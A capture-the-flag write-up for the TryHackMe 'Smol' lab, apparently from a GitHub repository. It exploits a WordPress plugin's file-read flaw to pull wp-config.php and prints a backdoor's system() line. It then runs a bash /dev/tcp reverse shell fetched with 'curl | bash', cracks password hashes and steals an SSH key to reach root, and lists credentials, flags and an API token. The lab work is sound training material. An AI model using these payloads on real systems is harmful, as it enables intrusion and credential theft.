
# Tryhacke smol machine
We are given the target on the TryHackMe page.
<img width="1011" height="113" alt="image" src="https://github.com/user-attachments/assets/95173a87-5ac5-4b49-b1a1-201aef014b81" />
* ip: 10.67.130.146

## PORT SCAN
A port scan was conducted, revealing only 2 open ports.
```bash
nmap -n -Pn -sV -sC -p- --min-rate 3000 10.67.130.146
```
<img width="777" height="307" alt="image" src="https://github.com/user-attachments/assets/6b8e669d-7aae-46ba-afab-bf8dba1ec29a" />

* SSH open
* Existing webpage, but not reachable/resolvable by the computer

<img width="690" height="281" alt="image" src="https://github.com/user-attachments/assets/661657db-83c6-4548-a7f8-2a6cab569d35" />

We will add the following host so the computer can recognize it: '10.67.130.146 www.smol.thm smol.thm'
```bash
nano /etc/hosts
```
<img width="629" height="254" alt="image" src="https://github.com/user-attachments/assets/f6f1698a-b089-4004-96d7-25f958b21b22" />

We reload the page "http://www.smol.thm"

<img width="825" height="426" alt="image" src="https://github.com/user-attachments/assets/c63198be-6a19-48a6-9217-3e1cf7ea250c" />

<img width="933" height="282" alt="image" src="https://github.com/user-attachments/assets/87005a1c-5578-4408-8aa8-27c5e58aed38" />

We will see that the page is built on WordPress, which is one of the most widely used content 
management systems. WPScan is a tool specifically designed to audit WordPress-based websites.

In this case, an API token will be used, which was obtained by registering on the WPScan website, 
allowing for }much faster enumeration.


<img width="1090" height="308" alt="image" src="https://github.com/user-attachments/assets/ac408e5c-4be0-4ddf-9f05-624159d7ece9" />

* API token: vJGaJw2bNx1BkwuvVarjWaHiMmqm5Zxn9ijIrXxryoY

```bash
wpscan --url http://www.smol.thm --api-token vJGaJw2bNx1BkwuvVarjWaHiMmqm5Zxn9ijIrXxryoY -e
```
<img width="1090" height="470" alt="image" src="https://github.com/user-attachments/assets/554a3d33-6acd-48d8-a48c-da3b8934b510" />

# Vulnerabildiad SSRF
This vulnerability was chosen because it allows the server to be deceived without requiring the website administrator to click on a link.
By visiting the page https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/,
we will find a PoC, which is basically a recipe on how to exploit this flaw.

<img width="1090" height="367" alt="image" src="https://github.com/user-attachments/assets/c5e357a5-d1b1-413b-b668-c34a18861a36" />

# Web Access-wpuser
Now, changing the address to the page and running the following command in Kali:
```bash
curl 'http://www.smol.thm//wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php'
```
<img width="881" height="459" alt="image" src="https://github.com/user-attachments/assets/f771102a-9563-47ad-a57f-19439d166a78" />

* **User**: wpuser
* **Password**: kbLSF2Vop#lw3rjDZ629*Z%G

The standard login page for WordPress sites is /wp-login.php, so we redirect the page to http://www.smol.thm/wp-login.php
and use the credentials we obtained.

While searching, it was found that in the Pages section there is something marked as “private.”
 
<img width="786" height="280" alt="image" src="https://github.com/user-attachments/assets/85514c79-79e6-41d7-bc99-c6535c4bb34e" />
 
<img width="786" height="280" alt="image" src="https://github.com/user-attachments/assets/cb5d9c6d-095f-4a91-8969-2db4eb79c6bb" />

A plugin called “Hello Dolly” is mentioned; we search for Hello Dolly on GitHub and find a hello.php file.

<img width="1090" height="222" alt="image" src="https://github.com/user-attachments/assets/64ae4a3a-9bb0-4cc9-892d-8d6eb0a357ab" />

We once again use the SSRF vulnerability to read the hello.php file.
```bash
curl 'http://www.smol.thm//wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php'
```
<img width="1090" height="284" alt="image" src="https://github.com/user-attachments/assets/f48a35ca-5685-4be5-a447-57aa3c0e7864" />

An eval command was found that drew attention because it is Base64-encoded. Using CyberChef, it was decoded and the following was found:
* **if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }**

By executing ASCII decoding and searching for 143, 155, 64, as well as 143, 6d, 144
```bash
man ascii
```
<img width="764" height="479" alt="image" src="https://github.com/user-attachments/assets/1e87732d-4200-4d1c-9f18-ed9f34389cc7" />

the parameter cmd was identified. We then return to the page and modify the URL to:
**http://www.smol.thm/wp-admin/?cmd=id**

<img width="867" height="214" alt="image" src="https://github.com/user-attachments/assets/eaf751a3-d2a7-4ec0-8392-082bc5c442a5" />

# Reverse shell
We verify that the command is executed on the page.
With this finding, we will perform a reverse shell. First, we add an IP on the tunnel we are using:
```bash
ip addr show tun0
```
<img width="1090" height="258" alt="image" src="https://github.com/user-attachments/assets/3b527fdb-2fd7-4a6e-8681-2b505f71596d" />

We create a file to open an interactive shell, redirecting the output to our IP and port 4444. This file will be called thmrev.sh:
```bash
nano thmrev.sh
```
The following content is added:
**#!/bin/bash
bash -i >& /dev/tcp/192.168.202.148/4444 0>&1**

<img width="597" height="125" alt="image" src="https://github.com/user-attachments/assets/af3d2914-6d1f-4a6a-a9e7-933cf7ebe40d" />

Now, in another terminal, we start a web server to transfer the previous file:
```bash
python3 -m http.server 80
```
<img width="944" height="167" alt="image" src="https://github.com/user-attachments/assets/65a7a050-59da-46d8-a209-5a120d742359" />

En otra abrimos un puerto de escucha para el reverse Shell
```bash
nc -lvnp 4444
```
<img width="995" height="225" alt="image" src="https://github.com/user-attachments/assets/41f96877-3ad8-4bae-823c-991b1ac7ce0c" />

Finally, we execute the following URL on the webpage to download and run the thmrev.sh file: "http://www.smol.thm/wp-admin/?cmd=curl%20192.168.202.148/thmrev.sh%20|%20bash"
By returning to the listening terminal, we will obtain the reverser shell.

<img width="842" height="309" alt="image" src="https://github.com/user-attachments/assets/b3e6ad87-0403-4ba0-a7f7-77364a1adc6a" />

# Nueva ip
In my case, I exited the machine and when turning it back on, the new target became: 10.64.180.142.

The shell is very basic and unstable; it is not possible to access MySQL or it loads very slowly. Therefore, a TTY is generated to obtain a more stable and fully functional terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
The environment is configured to use a modern terminal such as xterm:

```bash
export TERM=xterm
```
Next, a Ctrl+Z is performed, which temporarily pauses the Netcat connection.

In the same terminal where Ctrl+Z was pressed, the following command is executed and the Enter key is pressed twice:

```bash
stty raw -echo; fg
```
<img width="881" height="326" alt="image" src="https://github.com/user-attachments/assets/e15fefe2-110c-41e0-9e0a-36b20ec540f8" />

Recalling the credentials obtained previously:

* **Username:** wpuser
* **Password:** kbLSF2Vop#lw3rjDZ629*Z%G

We access the database:

```bash
mysql -u wpuser -p
```
<img width="950" height="214" alt="image" src="https://github.com/user-attachments/assets/6e0420cb-c60b-42a0-97e4-37460114cc44" />

We check which databases are available:

```bash
show databases;
```
<img width="347" height="298" alt="image" src="https://github.com/user-attachments/assets/f58f9143-8242-49df-bd3c-89a3eb481ba3" />

We use the wordpress database and list its tables:

```bash
use wordpress;
show tables;
```
<img width="400" height="425" alt="image" src="https://github.com/user-attachments/assets/03d8c142-9932-41be-b0e7-614be68ae947" />

We look for the table called wp_users:

```bash
describe wp_users;
select user_login, user_pass from wp_users;
```
<img width="766" height="487" alt="image" src="https://github.com/user-attachments/assets/396d3674-5854-43a7-b273-9a699e15cfe5" />

We save the hashes into a file called hashes.txt and use the John the Ripper tool to crack them:

admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.

wpuser:$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. 

think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ 

gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 

diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 

xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
<img width="813" height="273" alt="image" src="https://github.com/user-attachments/assets/d6662a67-15be-4b73-8f83-33c43a5193e4" />

Only Diego’s password is cracked quickly; the others take much longer.
Analyzing Diego’s case:

<img width="591" height="153" alt="image" src="https://github.com/user-attachments/assets/a85cdae0-da26-4c54-acba-21f51a483544" />

<img width="417" height="114" alt="image" src="https://github.com/user-attachments/assets/315e03ee-f0ca-4c53-80fc-134c34409fe1" />

The remaining ones would take too long to test one by one, so nxc will be used instead.

We observe that Diego’s password is cracked easily, and we check whether this user has privileged access.

<img width="833" height="105" alt="image" src="https://github.com/user-attachments/assets/a5a71d03-bc7d-49ce-be6e-59a9fc4e2bf8" />

It will not work because SMB is for Windows machines, and SSH will not work either.

<img width="1028" height="297" alt="image" src="https://github.com/user-attachments/assets/a755de2b-1e27-4622-b0ef-be481f6a0799" />

Returning to the shell that was previously obtained, the su command is used to switch to the diego user:

```bash
su - diego
```
<img width="727" height="94" alt="image" src="https://github.com/user-attachments/assets/f9071c4f-c565-4fb1-bcf3-bd78344953c1" />

Once inside, we search for hidden files and begin a detailed enumeration. The 2>/dev/null part acts as a filter; since we are a normal user, many permission denied errors will appear. This redirection suppresses those errors. During this process, the first flag is also found:

```bash
ls -la
cat user.txt
find . -ls 2>/dev/null
```
<img width="840" height="474" alt="image" src="https://github.com/user-attachments/assets/20c0490e-9a4d-4231-b9bc-da14910d830b" />

SSH stores configuration files for remote connections.

<img width="1090" height="173" alt="image" src="https://github.com/user-attachments/assets/79080506-09c9-4433-8db4-ba3527540436" />

We navigate to the following directory to see what can be found:

```bash
cd /think/.ssh
ls
```
<img width="642" height="136" alt="image" src="https://github.com/user-attachments/assets/7dba0a63-af9c-402e-a83d-9dc805209aea" />

We read the id_rsa file using cat and observe its contents.

<img width="722" height="514" alt="image" src="https://github.com/user-attachments/assets/bc5a2c62-4d2b-4a47-a949-bbb27be03ec3" />

On Kali, the entire key is saved into a file:

```bash
nano think_key
```
<img width="895" height="270" alt="image" src="https://github.com/user-attachments/assets/8b42757c-878b-4ea1-982f-789113367d40" />

Then, the appropriate permissions are set to allow SSH access:

```bash
chmod 600 think_key
```
We connect via SSH as the think user, using the think_key private key:

```bash
ssh -i think_key think@10.64.180.142
```
<img width="855" height="319" alt="image" src="https://github.com/user-attachments/assets/384b0111-57b3-485b-a078-e6fbbe235664" />

We list the directories (ls -lah), but more importantly, we examine the PAM configuration file located at /etc/pam.d/su. 

PAM (Pluggable Authentication Modules) is a Linux security system that defines who is allowed to do what through authentication rules. To remove noise, a grep filter is applied:

```bash
cat /etc/pam.d/su | grep -v "^#"
```
<img width="930" height="166" alt="image" src="https://github.com/user-attachments/assets/d219625b-9b16-4634-baf8-2ae8b62db828" />

Based on the findings, we discover that we can switch to the gege user without being prompted for a password:

```bash
su - gege
```
<img width="913" height="319" alt="image" src="https://github.com/user-attachments/assets/e23dbc81-574d-4b79-b72e-7f5cf899560a" />

A .old file is found (.bak files also indicate backups). These files usually store backups made before password changes. Since the machine has Python 3 installed, we start a web server on port 8000:

```bash
python3 -m http.server 8000
```
<img width="1038" height="119" alt="image" src="https://github.com/user-attachments/assets/ac20a3b2-71a5-4142-aaef-b598778d2a1e" />

We then download the file to Kali:

```bash
wget http://10.64.180.142:8000/wordpress.old.zip
```
<img width="1019" height="272" alt="image" src="https://github.com/user-attachments/assets/cfab33d3-ecea-44f6-9678-df8f61a7ecae" />

When attempting to unzip the file, a password is required, so John the Ripper is used again.

<img width="753" height="167" alt="image" src="https://github.com/user-attachments/assets/c488a3c6-dc07-46ff-a225-8558038cdb42" />

We will extract the password hash and save it in a file called hash.txt

```bash
zip2john wordpress.old.zip > zip_hash.txt
```
<img width="422" height="356" alt="image" src="https://github.com/user-attachments/assets/b0b7ee72-b576-411e-9b33-dd5702dd5ca0" />

Next, the password is cracked using John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
```
<img width="852" height="281" alt="image" src="https://github.com/user-attachments/assets/7bfdb3d6-4a7c-41e6-bccc-f2e9b9180c37" />

* **ZIP file password:** hero_gege@hotmail.com

We unzip the file again:

```bash
unzip wordpress.old.zip
```
Finally, we navigate into the extracted directory and read the wp-config.php file.

<img width="1090" height="249" alt="image" src="https://github.com/user-attachments/assets/ad3a1d9e-e5e7-4c3a-8213-6216cc459f7c" />

<img width="833" height="378" alt="image" src="https://github.com/user-attachments/assets/4a8a3dad-31c0-4f72-aa34-f06bdf12570b" />

* User: xavi
* Password: P@ssw0rdxavi@

Now, from gege’s shell, we switch to the xavi user and verify that this account has privileged permissions:

```bash
su - xavi
sudo -l   # to check if the user has privileged access
```
<img width="1090" height="283" alt="image" src="https://github.com/user-attachments/assets/a775a260-b826-4f73-a6d0-cdefe3483b24" />

Since the user has elevated privileges, we escalate to root:

```bash
sudo su
```
<img width="903" height="503" alt="image" src="https://github.com/user-attachments/assets/d1b3d89a-602f-4a6a-a519-aa470c7197e0" />

We then read the root.txt file.

Flags found:

/home/diego/user.txt : 45edaec653ff9ee06236b7ce72b86963

/root/root.txt : bf89ea3ea01992353aef1f576214d4e4






























